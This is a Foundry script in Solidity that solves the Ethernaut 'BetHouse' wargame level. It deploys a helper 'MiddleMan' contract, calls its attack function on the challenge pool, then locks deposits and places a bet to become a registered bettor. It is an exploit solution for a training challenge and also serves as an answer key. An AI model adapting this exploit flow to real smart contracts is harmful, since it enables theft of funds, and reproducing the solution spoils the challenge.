pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "test/openzeppelin-ethernaut/BetHouse.t.sol";

contract BetHouseScript is Script {
    function run() external {
        vm.startBroadcast();
        MiddleMan middleMan = new MiddleMan();
        BetHouse instance = BetHouse(vm.envAddress("BETHOUSE"));

        Pool pool = Pool(instance.pool());
        PoolToken depositToken = PoolToken(pool.depositToken());
        depositToken.transfer(address(middleMan), 5);
        middleMan.attack{value: 0.001 ether}(address(pool), 5);

        address myAddress = vm.envAddress("MY_ADDRESS");
        pool.lockDeposits();
        instance.makeBet(myAddress);

        require(instance.isBettor(myAddress) == true, "failed");

        vm.stopBroadcast();
    }
}
